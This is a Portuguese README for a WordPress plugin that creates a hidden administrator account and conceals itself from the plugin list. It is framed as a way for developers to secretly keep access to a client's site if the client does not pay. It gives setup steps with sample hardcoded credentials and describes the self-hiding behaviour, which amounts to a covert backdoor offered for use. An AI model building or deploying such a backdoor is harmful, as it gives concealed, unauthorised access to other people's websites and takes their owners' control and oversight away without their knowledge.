# Magic-User-WP  
**O Mago da Privacidade no WordPress!**

Este plugin foi especialmente desenvolvido para desenvolvedores WordPress que precisam acessar o site do cliente por questões de segurança. Em alguns casos, o comprador pode cancelar o pedido ou não realizar o pagamento após o desenvolvimento do site. Com este plugin, você pode acessar o site do cliente de forma discreta, mantendo sua conta de usuário oculta na página de usuários.

---

## Como Usar?

Este plugin foi desenvolvido por motivos de segurança, por isso não criamos nenhuma página de frontend para configurações. Você precisará editar algumas opções antes de usá-lo.

### 1. **Primeiro, edite a função de usuário**

Na linha #26, você encontrará a função `wpshield_addHiddenUserFunction()`. Nessa função, defina os valores das variáveis `$username`, `$useremail` e `$userpass` com suas informações.


$username   =   "wpshield"; \n
$useremail  =   "contato@wpshield.com.br"; \n
$userpass   =   "wpshield@75321#";


### 2. **Segundo, edite a função da tabela de usuários**

Na linha #48, você encontrará a função `wpshield_preUserQuery()`. Nessa função, defina o valor da variável `$hiddenuser` com o valor da sua variável `$username`, como mostrado abaixo:

```php
$hiddenuser = $username;

### 3. **Terceiro, esconder o plugin**

Na versão 1.0.1, após a ativação, o plugin será automaticamente ocultado da lista de plugins.

**Use com sabedoria.** 🔒

